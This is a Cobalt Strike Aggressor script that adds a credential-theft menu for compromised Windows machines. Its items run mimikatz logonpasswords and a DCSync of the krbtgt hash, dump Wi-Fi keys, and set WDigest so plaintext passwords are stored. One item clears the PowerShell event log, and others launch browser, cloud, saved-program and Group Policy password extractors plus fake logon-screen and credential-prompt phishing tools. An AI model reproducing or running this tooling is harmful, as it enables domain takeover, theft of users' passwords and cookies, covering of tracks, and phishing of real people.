menu "Read password" {
  item "logonpasswords" {
    $bid = $1['@'];
    bmimikatz($bid, "sekurlsa::logonpasswords");
  }
  item "Krbtgt hash" {
    $bid = $1['@'];
    $dialog = dialog("Krbtgt NTLM-Hash" , %(domain => "xxx.com" , user => "krbtgt", bid => $bid), &krbtgt);
    dialog_description($dialog, "Use Mimikatz to read NTLM-Hash of Krbtgt account.");
    drow_text($dialog, "domain", "Domain: ");
  	drow_text($dialog, "user", "User: ");
    dbutton_action($dialog, "run");
    dialog_show($dialog);
	}
  sub krbtgt{
    $domain = $3['domain'];
    $user = $3['user'];
	  bmimikatz($bid, "lsadump::dcsync /domain:$domain /user:$user");
  }

  menu "Detect wifi password" {
    item "Get connected wifi" {
      local('$bid');
      foreach $bid ($1){
        bshell($1, "netsh wlan show profiles");
      }
    }
    item "Get wifi password" {
      prompt_text("Enter wifi name: ", "", lambda({
        bshell(@ids, "netsh wlan show profile name=\"$1\" key=clear");
      }, @ids => $1));
    }
    item "SharpWifiGrabber(Retrieve Wi-Fi password)"{
      blog($1, "project address：https://github.com/r3nhat/SharpWifiGrabber")
      bexecute_assembly($1, script_resource('/scripts/Grab password/SharpWifiGrabber.exe'), "");
    }
  }

  menu "Modify the registry dump plaintext password" {
    item "Show plaintext" {
      local('$bid');
      foreach $bid ($1){
        bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
      }
    }
    item "强制锁屏" {
      local('$bid');
      foreach $bid ($1){
        blog($1, "正在执行锁屏");
        bpowershell_import($bid, script_resource("/scripts/Grab password/lock-screen.ps1"));
        bpowerpick($bid,"Lock-WorkStation");
        bshell($bid,"wevtutil cl \"Windows PowerShell\"");
      }
    }
    item "Hide plaintext" {
      local('$bid');
      foreach $bid ($1){
        bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f");
      }
    }
  }

  menu "Extract browser data and password" {
    item "BrowserGhost(Extract browser password)" {
      blog($1, "Project address：https://github.com/QAX-A-Team/BrowserGhost")
      bexecute_assembly($1, script_resource("/scripts/Grab password/BrowserGhost.exe"));
    }

    item "SharpChromium(Extract browser data)" {
      $bid = $1['@'];
      $dialog = dialog("SharpChromium", %(bid => $bid), &SharpChromium);
      dialog_description($dialog,".NET 4.0 CLRItems used to retrieve Chromium data, such as cookies, history, and saved login names. project address：https://github.com/djhohnstein/SharpChromium");
      drow_combobox($dialog, "Type", "all/cookies/history/logins", @("all", "cookies","history","logins"));
      dbutton_action($dialog, "run");
      dialog_show($dialog);
    }
    sub SharpChromium {
      bexecute_assembly($bid, script_resource("/scripts/Grab password/SharpChromium.exe"), $3['Type']);
    }

    item "SharpWeb(提取浏览器数据)" {
      $bid = $1['@'];
      $dialog = dialog("SharpChromium", %(bid => $bid), &SharpWeb);
      dialog_description($dialog,"可从Google Chrome，Mozilla Firefox和Microsoft Internet Explorer/Edge检索保存的浏览器凭据。项目地址：https://github.com/djhohnstein/SharpWeb");
      drow_combobox($dialog, "Type", "all/chrome/firefox/edge", @("all", "chrome","firefox","edge"));
      dbutton_action($dialog, "运行");
      dialog_show($dialog);
    }
    sub SharpWeb {
      bexecute_assembly($bid, script_resource("/scripts/Grab password/SharpWeb.exe"), $3['Type']);
    }
  }

  menu "Local program file password decryption" {
    item "SharpCloud(Get cloud credentials)" {
      $bid = $1['@'];
      $dialog = dialog("Get cloud credentials", %(bid => $bid), &SharpCloud);
      dialog_description($dialog, "Used to check if there is a connection with AWS，Microsoft Credential files related to Azure and Google Compute. Project address：https://github.com/chrismaddalena/SharpCloud");
      drow_combobox($dialog, "type", "type:", @("all","aws","azure","gcloud"));
      dbutton_action($dialog, "run");
      dialog_show($dialog);
    }
    sub SharpCloud {
      $arg = join(' ',  @($3['type']));
      bexecute_assembly($bid, script_resource("/scripts/Grab password/SharpCloud.exe"), $arg);
    }
    menu "SharpDecryptPwd(from uknowsec)" {
      item "SharpDecryptPwd" {
        $bid = $1['@'];
        $dialog = dialog("SharpDecryptPwd", %(type => "-NavicatCrypto",bid => $bid), &SharpDecryptPwd);
        dialog_description($dialog,"Analyze some programs whose passwords have been saved on the Windwos system, including: Navicat, TeamViewer, FileZilla, WinSCP, Xmangager series products (Xshell, Xftp). Project address：https://github.com/uknowsec/SharpDecryptPwd");
        drow_combobox($dialog, "type", "Type:", @("-NavicatCrypto", "-TeamViewer", "-FileZilla","-WinSCP"));
        dbutton_action($dialog, "run");
        dialog_show($dialog);
      }
      item "Xmangager" {
        $bid = $1['@'];
        $dialog = dialog("Xmangager", %(type => "-Xmangager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager);
        dialog_description($dialog, "Series products, such as: Xshell, Xftp.");
        drow_combobox($dialog, "type", "Type:", @("-Xmangager"));
        drow_text($dialog, "path", "Sessions Path:  ");
        dbutton_action($dialog, "run");
        dialog_show($dialog);
      }
    }
    sub SharpDecryptPwd {
      bexecute_assembly($bid, script_resource("/scripts/Grab password/SharpDecryptPwd.exe"), $3['type']);
    }
    sub Xmangager {
      $arg = join(' ', @($3['type'],"-p",$3['path']));
      bexecute_assembly($bid, script_resource("/scripts/Grab password/SharpDecryptPwd.exe"), $arg);
    }

    menu "SharpDecryptPwd(from RcoIl)" {
      item "SharpDecryptPwd40" {
        $bid = $1['@'];
        $dialog = dialog("SharpDecryptPwd40", %(type => "-Navicat",bid => $bid), &SharpDecryptPwd40);
        dialog_description($dialog,"Currently supports Navicat series, Xmanager series, TeamViewer, FileZilla client, Foxmail, RealVNC server, TortoiseSVN, WinSCP, Chrome all versions. project address：https://github.com/RcoIl/SharpDecryptPwd");
        drow_combobox($dialog, "type", "Type:", @("-Navicat", "-TeamViewer", "-FileZilla","-WinSCP","-Foxmail","-RealVNC","-TortoiseSVN","-Chrome"));
        dbutton_action($dialog, "run");
        dialog_show($dialog);
      }
      item "Xmangager40" {
        $bid = $1['@'];
        $dialog = dialog("Xmangager", %(type => "-Xmanager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager40);
        dialog_description($dialog, "Xmangager series products, such as: Xshell, Xftp.");
        drow_combobox($dialog, "type", "Type:", @("-Xmanager"));
        drow_text($dialog, "path", "Sessions Path:  ");
        dbutton_action($dialog, "run");
        dialog_show($dialog);
      }
    }
    sub SharpDecryptPwd40 {
      bexecute_assembly($bid, script_resource("/scripts/Grab password/SharpDecryptPwd40.exe"), $3['type']);
    }
    sub Xmangager40 {
      $arg = join(' ', @($3['type'],"-p",$3['path']));
      bexecute_assembly($bid, script_resource("/scripts/Grab password/SharpDecryptPwd40.exe"), $arg);
    }
  }

  item "Net-GPPPassword(Group Policy account credentials)" {
    blog($1, ".NET Get-GPPPassword implemented. Retrieve clear text passwords and other information for accounts pushed through Group Policy preferences. This technique is old, but still useful in environments where domains were created long ago. project address：https://github.com/outflanknl/Net-GPPPassword")
    bexecute_assembly($1, script_resource("/scripts/Grab password/Net-GPPPassword_dotNET_v2.exe"), "");
  }

  menu "Phishing password stealing" {
    item "FakeLogonScreen(Windows lock screen fishing)" {
      $bid = $1;
      $dialog = dialog("FakeLogonScreen", %(bid => $bid), &FakeLogonScreen);
      dialog_description($dialog, "FakeLogonScreen is a utility program used to fake a Windows login screen to obtain user passwords. The entered password has been verified against Active Directory or the local computer to ensure that the password is correct, and the output is written to the console and %LOCALAPPDATA%\\Microsoft\\user.db file. Since fake pages are hard to describe, use with caution!!! project address：https://github.com/bitsadmin/fakelogonscreen");
      dbutton_action($dialog, "run");
      dialog_show($dialog);
    }
    sub FakeLogonScreen {
      bexecute_assembly($bid, script_resource("/scripts/Grab password/FakeLogonScreenToFile.exe"), "");
    }

    item "CredPhisher(Authentication login box phishing)" {
      $bid = $1['@'];
      $dialog = dialog("CredPhisher", %(content => "Safety certificate",bid => $bid), &CredPhisher);
      dialog_description($dialog, "The security authentication login box pops up, phishing. The windows10 test was successful. Project address：https://github.com/matterpreter/OffensiveCSharp/tree/master/CredPhisher");
      drow_text($dialog, "content", "content:");
      dbutton_action($dialog, "run");
      dialog_show($dialog);
    }
    sub CredPhisher {
      $arg = join('',@("",$3['content']));
      bexecute_assembly($bid, script_resource("/scripts/Grab password/CredPhisher.exe"), $arg);
    }
  }
}
